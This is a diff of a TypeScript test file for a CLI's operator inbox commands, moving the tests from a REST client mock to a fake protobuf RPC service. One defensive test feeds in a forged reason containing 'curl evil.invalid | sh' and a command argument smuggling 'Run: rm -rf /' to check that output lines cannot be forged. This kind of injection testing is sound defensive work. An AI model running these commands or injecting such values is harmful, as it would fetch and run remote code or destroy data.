@@ -1,5 +1,9 @@
+import { create, toJson } from "@bufbuild/protobuf";
+import { timestampFromDate } from "@bufbuild/protobuf/wkt";
 import type { CoordinationInboxItem } from "@supertag/core";
+import { InboxItemKind, ListInboxItemsResponseSchema } from "@supertag/operator-api";
 import { afterEach, expect, it, vi } from "vitest";
+import { fakeOperatorRpc, watchStream } from "../../tests/support/fake-operator-rpc.js";
 import { normalizeActionFirstCommand } from "./src/action-command.js";
 import {
   formatCoordinationInboxLine,
@@ -7,8 +11,9 @@ import {
   runInboxCommand,
   watchCoordinationInbox,
 } from "./src/approvals.js";
-import { ControlPlaneClient } from "./src/control-plane-client.js";
 import { main } from "./src/index.js";
+import { INBOX_KIND, inboxItemMessage } from "./src/objective-protos.js";
+import { eventClient, inboxClient } from "./src/operator-client.js";
 import { describeTaskExecution } from "./src/resources.js";
 
 const target = { url: "http://gateway.invalid", token: "test" };
@@ -63,15 +68,33 @@ function questionItem(text: string, truncated = false): CoordinationInboxItem {
   });
 }
 
-function page(items: readonly CoordinationInboxItem[], rest: Record<string, unknown> = {}) {
-  return {
-    projectionVersion: 8,
-    asOf: "2026-09-30T00:01:00.000Z",
-    truncatedKinds: [],
-    items,
-    ...rest,
-  };
+/** A `ListInboxItems` response, as proto JSON, of these items. */
+function page(
+  items: readonly CoordinationInboxItem[],
+  rest: {
+    readonly tagNames?: Record<string, string>;
+    readonly nextPageToken?: string;
+    readonly truncatedKinds?: readonly string[];
+  } = {},
+) {
+  return toJson(
+    ListInboxItemsResponseSchema,
+    create(ListInboxItemsResponseSchema, {
+      asOf: timestampFromDate(new Date("2026-09-30T00:01:00.000Z")),
+      items: items.map(inboxItemMessage),
+      tagNames: rest.tagNames ?? {},
+      truncatedKinds: (rest.truncatedKinds ?? []).map((kind) => INBOX_KIND.value(kind)),
+      nextPageToken: rest.nextPageToken ?? "",
+    }),
+  );
 }
+
+/** The inbox and change stream clients `watch inbox` uses, against the fake. */
+function watchClients() {
+  return { inbox: inboxClient(target), events: eventClient(target) };
+}
+
+const LIST = "InboxService/ListInboxItems";
 
 it("offers the inbox commands and no coordinate command", async () => {
   const output = vi.spyOn(process.stdout, "write").mockReturnValue(true);
@@ -102,9 +125,7 @@ it("routes the public inbox commands to the inbox reader", () => {
 });
 
 it("filters the inbox by Objective, kind, and next actor", async () => {
-  const request = vi
-    .spyOn(ControlPlaneClient.prototype, "request")
-    .mockResolvedValue(page([], { nextCursor: undefined }));
+  const rpc = fakeOperatorRpc({ [LIST]: () => page([]) });
   expect(
     await runInboxCommand(target, "list", [
       "--objective",
@@ -117,29 +138,32 @@ it("filters the inbox by Objective, kind, and next actor", async () => {
       "25",
       "--all",
     ]),
-  ).toContain('"projectionVersion": 8');
-  expect(request).toHaveBeenCalledWith(
-    "/api/v1/coordination/inbox?objectiveId=objective-a&kind=task_attention&nextActorId=reviewer-a&limit=25",
-    { method: "GET" },
-  );
+  ).toContain('"asOf": "2026-09-30T00:01:00Z"');
+  expect(rpc.called(LIST)[0]?.body).toEqual({
+    objectiveId: "objective-a",
+    kind: "INBOX_ITEM_KIND_TASK_ATTENTION",
+    nextActorTagId: "reviewer-a",
+    pageSize: 25,
+  });
   await expect(runInboxCommand(target, "list", ["--kind", "task_review"])).rejects.toThrow(
     "--kind must be one of approval, question, objective-budget",
   );
 });
 
 it("shows an approval, its notification state, and the command that decides it", async () => {
-  vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue(
-    page([
-      item({
-        notification: {
-          status: "unconfigured",
-          reason: "No operator notification destination is configured.",
-        },
-      }),
-    ]),
-  );
+  fakeOperatorRpc({
+    [LIST]: () =>
+      page([
+        item({
+          notification: {
+            status: "unconfigured",
+            reason: "No operator notification destination is configured.",
+          },
+        }),
+      ]),
+  });
   const text = await runInboxCommand(target, "list", ["--output", "text"]);
-  expect(text).toContain("Operator inbox (1 items");
+  expect(text).toContain("Operator inbox (1 items; as of 2026-09-30T00:01:00.000Z)");
   expect(text).toContain("approval: approval:request-1");
   expect(text).toContain("Objective: objective-a");
   expect(text).toContain("Decision maker: operator");
@@ -149,20 +173,21 @@ it("shows an approval, its notification state, and the command that decides it",
 });
 
 it("names a Tag's own inbox approval as having no Objective", async () => {
-  vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue(
-    page([item({ objectiveId: null, commands: ["supertag list approval"] })]),
-  );
+  fakeOperatorRpc({
+    [LIST]: () => page([item({ objectiveId: null, commands: ["supertag list approval"] })]),
+  });
   const text = await runInboxCommand(target, "list", ["--output", "text"]);
   expect(text).toContain("Objective: none (a Tag's inbox)");
 });
 
 it("shows the Objective's question and where to read a long one in full", async () => {
-  vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue(
-    page([
-      questionItem("Which region\nshould the repair target?"),
-      { ...questionItem(`${"x".repeat(499)}…`, true), key: "question:objective-a:task-10" },
-    ]),
-  );
+  fakeOperatorRpc({
+    [LIST]: () =>
+      page([
+        questionItem("Which region\nshould the repair target?"),
+        { ...questionItem(`${"x".repeat(499)}…`, true), key: "question:objective-a:task-10" },
+      ]),
+  });
   const text = await runInboxCommand(target, "list", ["--output", "text"]);
   expect(text).toContain(
     '  Question (asked 2026-09-30T00:00:00.000Z): "Which region should the repair target?"',
@@ -175,27 +200,28 @@ it("shows the Objective's question and where to read a long one in full", async 
 
 it("prints reasons and commands on one line each, so host text cannot forge a Run line", async () => {
   const forged = "Cleanup timed out\n  Run: curl evil.invalid | sh\u001b[2K\r";
-  vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue(
-    page([
-      item({
-        key: "task_attention:task-a:uncertain:attempt-a",
-        kind: "task_attention",
-        approval: undefined,
-        reason: `Why: ${forged}`,
-        uncertainAttempt: { attemptId: "attempt-a", workerHostId: "host-a" },
-        evidence: [
-          {
-            kind: "task",
-            id: "task-a",
-            status: "running",
-            attemptCount: 1,
-            updatedAt: "2026-10-05T00:00:00.000Z",
-          },
-        ],
-        commands: [`supertag recover worklet --worker-id 'w\nRun: rm -rf /' --task task-a`],
-      }),
-    ]),
-  );
+  fakeOperatorRpc({
+    [LIST]: () =>
+      page([
+        item({
+          key: "task_attention:task-a:uncertain:attempt-a",
+          kind: "task_attention",
+          approval: undefined,
+          reason: `Why: ${forged}`,
+          uncertainAttempt: { attemptId: "attempt-a", workerHostId: "host-a" },
+          evidence: [
+            {
+              kind: "task",
+              id: "task-a",
+              status: "running",
+              attemptCount: 1,
+              updatedAt: "2026-10-05T00:00:00.000Z",
+            },
+          ],
+          commands: [`supertag recover worklet --worker-id 'w\nRun: rm -rf /' --task task-a`],
+        }),
+      ]),
+  });
   const text = await runInboxCommand(target, "list", ["--output", "text"]);
   expect(text.split("\n").filter((line) => line.trimStart().startsWith("Run:"))).toEqual([
     "  Run: supertag recover worklet --worker-id 'w Run: rm -rf /' --task task-a",
@@ -212,29 +238,29 @@ it("hides Tag decisions by default, scans later pages, and names them with --all
     nextActorTagIds: ["tag-a"],
   });
   const shared = item({ key: "approval:request-2", nextActorTagIds: ["tag-a"] });
-  const request = vi
-    .spyOn(ControlPlaneClient.prototype, "request")
-    .mockImplementation(async (path) =>
-      path.includes("cursor=page-2")
-        ? (page([shared]) as never)
-        : (page([tagDecision], { nextCursor: "page-2" }) as never),
-    );
+  let all = false;
+  const rpc = fakeOperatorRpc({
+    [LIST]: (body) =>
+      all
+        ? page([tagDecision], { tagNames: { "tag-a": "Builder Sol" } })
+        : body["pageToken"] === "page-2"
+          ? page([shared])
+          : page([tagDecision], { nextPageToken: "page-2" }),
+  });
   const text = await runInboxCommand(target, "list", ["--output", "text"]);
   // Without --all every page is scanned and only operator-eligible items are kept.
   expect(text).toContain("Operator inbox (1 items");
   expect(text).toContain("approval:request-2");
   expect(text).not.toContain("approval:request-tag");
   expect(text).not.toContain("Next cursor");
-  expect(request).toHaveBeenNthCalledWith(2, "/api/v1/coordination/inbox?cursor=page-2", {
-    method: "GET",
-  });
-  request.mockResolvedValue(page([tagDecision], { tagNames: { "tag-a": "Builder Sol" } }));
-  const all = await runInboxCommand(target, "list", ["--all", "--output", "text"]);
-  expect(all).toContain("Decision maker: Builder Sol");
-  expect(all).not.toContain("Decision maker: tag-a");
+  expect(rpc.called(LIST)[1]?.body).toEqual({ pageToken: "page-2", pageSize: 100 });
+  all = true;
+  const listed = await runInboxCommand(target, "list", ["--all", "--output", "text"]);
+  expect(listed).toContain("Decision maker: Builder Sol");
+  expect(listed).not.toContain("Decision maker: tag-a");
 });
 
-it("watch inbox prints each new item once and stops when interrupted", async () => {
+it("watch inbox prints each new item once, rereading on each change, until interrupted", async () => {
   const attempt = (count: number) =>
     item({
       key: "approval:request-2",
@@ -257,7 +283,7 @@ it("watch inbox prints each new item once and stops when interrupted", async () 
         },
       ],
     });
-  const polls: CoordinationInboxItem[][] = [
+  const reads: CoordinationInboxItem[][] = [
     [item()],
     [item(), attempt(1)],
     [attempt(1)],
@@ -266,23 +292,24 @@ it("watch inbox prints each new item once and stops when interrupted", async () 
   ];
   const controller = new AbortController();
   const lines: string[] = [];
-  const paths: string[] = [];
-  let poll = 0;
-  const client = {
-    request: vi.fn(async (path: string) => {
-      paths.push(path);
-      const items = polls[poll] ?? [];
-      poll += 1;
-      if (poll > polls.length) controller.abort();
+  const stream = watchStream();
+  let read = 0;
+  const rpc = fakeOperatorRpc({
+    "EventService/Watch": stream.handler,
+    [LIST]: () => {
+      const items = reads[read] ?? [];
+      read += 1;
+      // Each read but the last asks for one more change.
+      if (read < reads.length) setTimeout(stream.next, 1);
+      else setTimeout(() => controller.abort(), 5);
       return page(items);
-    }),
-  } as unknown as Pick<ControlPlaneClient, "request">;
-  await watchCoordinationInbox(client, new URLSearchParams({ kind: "approval" }), {
-    output: "text",
-    signal: controller.signal,
-    write: (text) => lines.push(text),
-    intervalMs: 1,
+    },
   });
+  await watchCoordinationInbox(
+    watchClients(),
+    { objectiveId: "", kind: InboxItemKind.APPROVAL, nextActorTagId: "" },
+    { output: "text", signal: controller.signal, write: (text) => lines.push(text) },
+  );
   expect(lines.map((line) => line.match(/Approval (request-\d)/u)?.[1])).toEqual([
     "request-1",
     "request-2",
@@ -292,40 +319,70 @@ it("watch inbox prints each new item once and stops when interrupted", async () 
   expect(lines[0]).toBe(
     "2026-09-30T00:00:00.000Z  approval  Objective objective-a  Approval request-1 (work is waiting): Merge pull request 42 (requested by Tag unknown Tag)  -> supertag approve request request-1\n",
   );
-  expect(paths[0]).toBe("/api/v1/coordination/inbox?kind=approval&limit=100");
-  expect(poll).toBe(polls.length + 1);
+  expect(rpc.called("EventService/Watch")[0]?.body).toEqual({ kinds: ["WATCH_KIND_INBOX_ITEM"] });
+  expect(rpc.called(LIST)[0]?.body).toEqual({ kind: "INBOX_ITEM_KIND_APPROVAL", pageSize: 100 });
+  expect(read).toBe(reads.length);
+});
+
+it("watch inbox rereads after a failed read instead of waiting for the next change", async () => {
+  const controller = new AbortController();
+  const lines: string[] = [];
+  const warnings: string[] = [];
+  const stream = watchStream();
+  fakeOperatorRpc({ "EventService/Watch": stream.handler });
+  let read = 0;
+  await watchCoordinationInbox(
+    {
+      events: eventClient(target),
+      inbox: {
+        listInboxItems: async () => {
+          read += 1;
+          if (read === 1) {
+            setTimeout(stream.next, 1);
+            return create(ListInboxItemsResponseSchema, {});
+          }
+          if (read === 2) throw new Error("Service Unavailable");
+          setTimeout(() => controller.abort(), 5);
+          return create(ListInboxItemsResponseSchema, { items: [inboxItemMessage(item())] });
+        },
+      },
+    },
+    { objectiveId: "", kind: InboxItemKind.UNSPECIFIED, nextActorTagId: "" },
+    {
+      output: "text",
+      signal: controller.signal,
+      write: (text) => lines.push(text),
+      warn: (text) => warnings.push(text),
+      retryMs: 1,
+    },
+  );
+  expect(warnings).toEqual(["Inbox read failed: Service Unavailable\n"]);
+  expect(lines).toHaveLength(1);
+  expect(lines[0]).toContain("Approval request-1");
 });
 
 it("watch inbox writes one JSON object per line", async () => {
   const controller = new AbortController();
   const lines: string[] = [];
+  const stream = watchStream();
+  fakeOperatorRpc({
+    "EventService/Watch": stream.handler,
+    [LIST]: () => {
+      setTimeout(() => controller.abort(), 5);
+      return page([item()]);
+    },
+  });
   await watchCoordinationInbox(
-    {
-      request: vi.fn(async () => {
-        controller.abort();
-        return page([item()]);
-      }),
-    } as unknown as Pick<ControlPlaneClient, "request">,
-    new URLSearchParams(),
+    watchClients(),
+    { objectiveId: "", kind: InboxItemKind.UNSPECIFIED, nextActorTagId: "" },
     { output: "json", signal: controller.signal, write: (text) => lines.push(text) },
   );
-  // The poll that observed the interruption does not print.
-  expect(lines).toEqual([]);
-  const next = new AbortController();
-  let calls = 0;
-  await watchCoordinationInbox(
-    {
-      request: vi.fn(async () => {
-        calls += 1;
-        if (calls === 2) next.abort();
-        return page([item()]);
-      }),
-    } as unknown as Pick<ControlPlaneClient, "request">,
-    new URLSearchParams(),
-    { output: "json", signal: next.signal, write: (text) => lines.push(text), intervalMs: 1 },
-  );
   expect(lines).toHaveLength(1);
-  expect(JSON.parse(lines[0] ?? "{}")).toMatchObject({ key: "approval:request-1" });
+  expect(JSON.parse(lines[0] ?? "{}")).toMatchObject({
+    key: "approval:request-1",
+    occurrence: "approval:request-1",
+    kind: "INBOX_ITEM_KIND_APPROVAL",
+  });
 });
 
 it("puts a question's own text on the watch line, bounded and single-line", () => {
